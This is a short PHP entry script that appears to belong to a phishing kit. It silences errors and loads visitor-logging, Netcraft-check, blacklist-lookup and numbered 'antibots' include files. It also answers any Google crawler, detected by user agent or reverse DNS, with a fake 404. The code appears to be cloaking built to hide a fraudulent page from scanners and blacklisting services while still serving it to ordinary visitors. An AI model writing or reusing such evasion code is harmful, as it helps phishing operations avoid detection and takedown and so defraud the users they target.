
<?php
require "includes/visitor_log.php";
require "includes/netcraft_check.php";
require "includes/blacklist_lookup.php";
?>
<?php
error_reporting(0);
$antibots = trim(file_get_contents("admin/config/status_antibots.ini"));
if($antibots == "on"){
include 'admin/config.php';
include "antibots/#1.php";
include "antibots/#2.php";
include "antibots/#3.php";
include "antibots/#4.php";
include "antibots/#5.php";
include "antibots/#6.php";
}
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if($antibots == "on"){
include "antibots/#7.php";
include "antibots/#8.php";
}

?>